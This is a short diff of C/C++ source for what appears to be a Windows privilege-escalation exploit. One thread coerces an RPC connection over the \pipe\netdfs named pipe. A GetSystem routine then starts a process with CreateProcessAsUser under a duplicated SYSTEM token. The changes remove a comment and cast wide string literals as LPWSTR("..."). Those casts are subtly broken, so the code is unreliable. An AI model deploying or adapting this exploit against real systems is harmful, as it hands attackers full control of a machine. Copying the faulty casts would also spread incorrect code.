@@ -343,7 +343,7 @@ DWORD WINAPI TriggerNamedPipeConnectionThread(LPVOID lpParam)
 	status = RpcStringBindingCompose(
 		NULL,
 		(RPC_WSTR)L"ncacn_np",
-		NULL,//这里取NULL也能代表本地连接
+		NULL,
 		(RPC_WSTR)L"\\pipe\\netdfs",
 		NULL,
 		&pszStringBinding
@@ -364,8 +364,9 @@ DWORD WINAPI TriggerNamedPipeConnectionThread(LPVOID lpParam)
 		//wprintf(pwszFileName);
 		long num1 = 101;
 		unsigned char p = 'a';
+
 		/* Trigger function to achieve RPC communication */
-		status = Proc13(BindingHandle, pwszFileName, L"test",1);
+		status = Proc13(BindingHandle, pwszFileName, LPWSTR("test"), 1);
 		wprintf(L"AzureAttestService Proc0:%d\n", status);
 		status = RpcBindingFree(
 			&BindingHandle                   // Reference to the opened binding handle
@@ -452,7 +453,7 @@ BOOL GetSystem(HANDLE hPipe)
 
 	ZeroMemory(&si, sizeof(STARTUPINFO));
 	si.cb = sizeof(STARTUPINFO);
-	si.lpDesktop = L"WinSta0\\default";
+	si.lpDesktop = LPWSTR("WinSta0\\default");
 
 	if (!CreateProcessAsUser(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, g_bInteractWithConsole, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
 	{
